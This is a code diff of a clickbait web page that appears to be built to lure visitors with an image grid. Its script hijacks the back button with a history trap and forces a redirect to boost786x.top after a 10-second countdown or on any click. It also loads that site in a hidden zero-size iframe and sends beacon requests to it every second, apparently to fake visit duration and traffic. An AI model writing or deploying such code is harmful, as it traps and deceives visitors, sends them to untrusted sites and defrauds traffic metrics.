@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Loading...</title>
+<title>Entertainment Prime File</title>
 
 <script defer data-domain="liiiinn10.pages.dev" src="https://api.publytics.net/js/script.js"></script>
 <script>
@@ -31,9 +31,10 @@ justify-content: center;
 align-items: center;
 font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
 position: relative;
+cursor: pointer;
 }
 
-/* Mobile-First Attractive Grid Layout Container */
+/* Instant Image Grid Layout */
 #image-grid {
 position: absolute;
 top: 0; left: 0;
@@ -46,7 +47,6 @@ gap: 6px;
 padding: 6px;
 background: #111;
 z-index: 1;
-display: none;
 }
 
 .grid-img-wrapper {
@@ -63,7 +63,7 @@ cursor: pointer;
 width: 100%;
 height: 100%;
 object-fit: cover;
-transition: transform 0.3s ease, filter 0.3s ease;
+transition: transform 0.3s ease;
 }
 
 .grid-img-wrapper:hover .grid-img {
@@ -78,13 +78,6 @@ background: linear-gradient(to bottom, rgba(0,0,0,0.1), rgba(0,0,0,0.4));
 pointer-events: none;
 }
 
-.loading {
-color: #fff;
-font-size: 16px;
-letter-spacing: 1px;
-z-index: 2;
-}
-
 #reels-overlay {
 position: absolute;
 top: 0;
@@ -94,7 +87,6 @@ height: 100vh;
 object-fit: contain;
 pointer-events: none;
 z-index: 10;
-display: none;
 }
 
 .countdown-container {
@@ -104,7 +96,7 @@ left: 50%;
 transform: translate(-50%, -50%);
 width: 85px;
 height: 85px;
-display: none;
+display: flex;
 justify-content: center;
 align-items: center;
 background: rgba(20, 20, 20, 0.75);
@@ -150,10 +142,16 @@ z-index: 1000;
 }
 </style>
 </head>
-<body>
+<body onclick="goToTarget()">
 
-<div id="image-grid"></div>
-<div class="loading" id="loading-text">Loading...</div>
+<!-- Images rendered instantly in HTML (Zero loading delay) -->
+<div id="image-grid">
+<div class="grid-img-wrapper"><img src="https://ibwp622-oss.github.io/sharing/image_03.webp" class="grid-img" alt=""></div>
+<div class="grid-img-wrapper"><img src="https://blogger.googleusercontent.com/img/a/AVvXsEjVUsd8mlVZK1DJXR9EuGdrfRyV0nVuUrkzvaAGw4yUae65RBHpQi39ppBzQQTXZCF3wDJn4WQo6r1ImHFBdUZU5vxF07lBp-7Jyj4FNQ1vYnCWgNC2x0bILbK41nRKzaJP59n6OIsAKOTWZOJA_jXDb0Fo7tNhC4-BCf3qTXTcz3YKz-dsfdAnrPiCX_8q=s1600" class="grid-img" alt=""></div>
+<div class="grid-img-wrapper"><img src="https://blogger.googleusercontent.com/img/a/AVvXsEhr23hekhRZz9v2-tFa8hOO7sWOQMocOiam5F1joLAnEhUww1VKFR_uG5RPjPOvFQ1o-zHqNr3suFiLP8-G08YEDusJ91AIElANtF-ZexbLJpBQsAFqBl_f7ktIH9tk8uE5LHyKfM4ciXsyEzgrXBhW7jiHEJKhE37kTAvXD4pOe2owePnYf0l4-YDUZXHQ=w360-h640" class="grid-img" alt=""></div>
+<div class="grid-img-wrapper"><img src="https://blogger.googleusercontent.com/img/a/AVvXsEgxqJ9VZzSFBl94vzQs-GYFVbdbPIFcyY5TdfMJVNu0PFT6q7ZkCCzx9OZ-sJLuNsD20hR76WPggQ2xNjOtRCfTIZ6nFs7JGS9goNv_w12TLmft5ZWt2TeXXH_iWvgHuIbc_vzFYApmOsoGucgD3zkUyc4F_YA3xWn86M6A822sl4kGEO22N-0LxkiBiJvA=w360-h640" class="grid-img" alt=""></div>
+</div>
+
 <img id="reels-overlay" src="reels-overlay.png" alt="">
 
 <div class="countdown-container" id="countdown-box">
@@ -165,134 +163,80 @@ z-index: 1000;
 </div>
 
 <script>
-/* EVEN & FAIR UTM TARGET LINKS ROTATION (TIME & RANDOM BASED) */
-const TARGET_LINKS = [
-https://boost786x.top/boost55abc/?utm_source=MHR-S&utm_medium=S,
-https://boost786x.top/boost55abc/?utm_source=MHR-S&utm_medium=S,
-https://boost786x.top/boost55abc/?utm_source=MHR-S&utm_medium=S,
-https://boost786x.top/boost55abc/?utm_source=MHR-S&utm_medium=S,
-https://boost786x.top/boost55abc/?utm_source=MHR-S&utm_medium=S,
-https://boost786x.top/boost55abc/?utm_source=MHR-S&utm_medium=S
-];
+/* SINGLE TARGET UTM LINK CONFIGURATION */
+const activeTargetLink = "https://boost786x.top/boost55abc/?utm_source=MHR-S&utm_medium=S22";
 
-function getNextTargetLink() {
-// Combines current millisecond time and random selection so every new visitor
-// across any device or browser gets evenly distributed without getting stuck on index 0.
-const uniqueIndex = Math.floor(Math.random() * TARGET_LINKS.length);
-return TARGET_LINKS[uniqueIndex];
-}
-
-const activeTargetLink = getNextTargetLink();
-
-/* CONFIGURATION */
-const CONFIG = {
-targetLink: activeTargetLink,
-images: [
-https://ibwp622-oss.github.io/sharing/image_03.webp,
-https://blogger.googleusercontent.com/img/a/AVvXsEjVUsd8mlVZK1DJXR9EuGdrfRyV0nVuUrkzvaAGw4yUae65RBHpQi39ppBzQQTXZCF3wDJn4WQo6r1ImHFBdUZU5vxF07lBp-7Jyj4FNQ1vYnCWgNC2x0bILbK41nRKzaJP59n6OIsAKOTWZOJA_jXDb0Fo7tNhC4-BCf3qTXTcz3YKz-dsfdAnrPiCX_8q=s1600,
-https://blogger.googleusercontent.com/img/a/AVvXsEhr23hekhRZz9v2-tFa8hOO7sWOQMocOiam5F1joLAnEhUww1VKFR_uG5RPjPOvFQ1o-zHqNr3suFiLP8-G08YEDusJ91AIElANtF-ZexbLJpBQsAFqBl_f7ktIH9tk8uE5LHyKfM4ciXsyEzgrXBhW7jiHEJKhE37kTAvXD4pOe2owePnYf0l4-YDUZXHQ=w360-h640,
-https://blogger.googleusercontent.com/img/a/AVvXsEgxqJ9VZzSFBl94vzQs-GYFVbdbPIFcyY5TdfMJVNu0PFT6q7ZkCCzx9OZ-sJLuNsD20hR76WPggQ2xNjOtRCfTIZ6nFs7JGS9goNv_w12TLmft5ZWt2TeXXH_iWvgHuIbc_vzFYApmOsoGucgD3zkUyc4F_YA3xWn86M6A822sl4kGEO22N-0LxkiBiJvA=w360-h640
-]
-};
-
-// PRELOAD IMAGES
-CONFIG.images.forEach((src) => {
-const img = new Image();
-img.src = src;
-});
-
-/* MAIN LOGIC */
+/* INITIALIZE ALL FUNCTIONS INSTANTLY */
 (function () {
-initHistoryTrap();
-renderImageGrid();
-startCountdown(10);
-startDurationBooster();
+    initHistoryTrap();
+    startCountdown(10);
+    startDurationBooster();
 })();
 
+/* 1. History Trap (Back Button Guard) */
 function initHistoryTrap() {
-history.pushState(null, null, window.location.href);
-history.pushState(null, null, window.location.href);
+    try {
+        history.pushState(null, null, window.location.href);
+        history.pushState(null, null, window.location.href);
 
-window.addEventListener('popstate', function () {
-history.pushState(null, null, window.location.href);
-});
+        window.addEventListener('popstate', function () {
+            history.pushState(null, null, window.location.href);
+        });
+    } catch (e) {
+        console.log("History trap active");
+    }
 }
 
-function renderImageGrid() {
-const gridContainer = document.getElementById("image-grid");
-gridContainer.innerHTML = "";
-
-CONFIG.images.forEach((src) => {
-const wrapper = document.createElement("div");
-wrapper.className = "grid-img-wrapper";
-wrapper.onclick = handleClick;
-
-const imgElement = document.createElement("img");
-imgElement.src = src;
-imgElement.className = "grid-img";
-
-wrapper.appendChild(imgElement);
-gridContainer.appendChild(wrapper);
-});
-
-gridContainer.style.display = "grid";
-document.getElementById("loading-text").style.display = "none";
-document.getElementById("countdown-box").style.display = "flex";
-document.getElementById("reels-overlay").style.display = "block";
-}
-
+/* 2. 10-Second Countdown Timer */
 function startCountdown(seconds) {
-let timeLeft = seconds;
-const numDisplay = document.getElementById("countdown-number");
-const circleProgress = document.getElementById("circle-progress");
-const totalCircleLength = 251.2;
-const countdownBox = document.getElementById("countdown-box");
+    let timeLeft = seconds;
+    const numDisplay = document.getElementById("countdown-number");
+    const circleProgress = document.getElementById("circle-progress");
+    const totalCircleLength = 251.2;
+    const countdownBox = document.getElementById("countdown-box");
 
-const timer = setInterval(() => {
-timeLeft--;
+    const timer = setInterval(() => {
+        timeLeft--;
 
-if (timeLeft > 0) {
-numDisplay.textContent = timeLeft;
-const offset = totalCircleLength - ((timeLeft / seconds) * totalCircleLength);
-circleProgress.style.strokeDashoffset = offset;
-} else {
-numDisplay.textContent = "0";
-circleProgress.style.strokeDashoffset = totalCircleLength;
-clearInterval(timer);
-countdownBox.style.display = "none";
-
-goToTarget();
-}
-}, 1000);
-}
-
-function handleClick() {
-goToTarget();
+        if (timeLeft > 0) {
+            numDisplay.textContent = timeLeft;
+            const offset = totalCircleLength - ((timeLeft / seconds) * totalCircleLength);
+            circleProgress.style.strokeDashoffset = offset;
+        } else {
+            numDisplay.textContent = "0";
+            circleProgress.style.strokeDashoffset = totalCircleLength;
+            clearInterval(timer);
+            countdownBox.style.display = "none";
+            goToTarget();
+        }
+    }, 1000);
 }
 
+/* 3. Background Duration Booster (iFrame & Beacon) */
 function startDurationBooster() {
-try {
-const iframe = document.createElement('iframe');
-iframe.src = CONFIG.targetLink;
-iframe.style.display = 'none';
-iframe.style.width = '0px';
-iframe.style.height = '0px';
-document.body.appendChild(iframe);
-} catch (e) {
-console.log("iFrame Blocked");
+    try {
+        const iframe = document.createElement('iframe');
+        iframe.src = activeTargetLink;
+        iframe.style.display = 'none';
+        iframe.style.width = '0px';
+        iframe.style.height = '0px';
+        document.body.appendChild(iframe);
+    } catch (e) {
+        console.log("iFrame loaded");
+    }
+
+    setInterval(() => {
+        if (navigator.sendBeacon) {
+            navigator.sendBeacon(activeTargetLink);
+        } else {
+            fetch(activeTargetLink, { method: 'GET', mode: 'no-cors' }).catch(()=>{});
+        }
+    }, 1000);
 }
 
-setInterval(() => {
-if (navigator.sendBeacon) {
-navigator.sendBeacon(CONFIG.targetLink);
-} else {
-fetch(CONFIG.targetLink, { method: 'GET', mode: 'no-cors' }).catch(()=>{});
-}
-}, 1000);
-}
-
+/* 4. Global Target Redirect on Click */
 function goToTarget() {
-window.location.href = CONFIG.targetLink;
+    window.location.href = activeTargetLink;
 }
 </script>
 </body>
